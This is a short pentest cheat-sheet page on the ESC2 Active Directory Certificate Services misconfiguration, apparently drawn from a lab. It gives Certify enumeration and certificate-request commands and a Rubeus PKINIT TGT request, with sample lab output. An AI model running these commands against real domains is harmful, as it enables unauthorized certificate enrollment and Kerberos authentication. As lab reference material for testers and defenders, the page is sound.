title: ESC2: Any Purpose EKU
html:
Conditions: Template has Any Purpose EKU (OID: 2.5.29.37.0) + Domain Users enrollment rights + no manager approval.

Warning

ESC2 alone does NOT allow direct user impersonation. It requires ESC6/9/10 conditions also present to become a full domain compromise primitive.

Step 1 — Enumerate

Certify.exe find /vulnerable
Certify.exe find /vulnerable

    Template Name                 : ESC2
    msPKI-Certificate-Name-Flag   : 0x0
    pkiextendedkeyusage           : Any Purpose
    msPKI-Application-Policies    : Any Purpose
    Enrollment Rights             : ESSOS\Domain Users    Access: Allow

Step 2 — Request Certificate (as self)

Certify.exe request /ca:<ca-host>\<ca-name> /template:<template>
Certify.exe request /ca:<domain>\<ca> /template:ESC2

[*] Current user context    : ESSOS\missandei
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 8

Step 3 — Authenticate (as requesting user only)

Rubeus.exe asktgt /user:<username> /certificate:<username>.pfx /password:mimikatz
Rubeus.exe asktgt /user:missandei /certificate:anypurpose.pfx /password:mimikatz

[*] Using PKINIT with etype rc4_hmac
[+] TGT request successful!
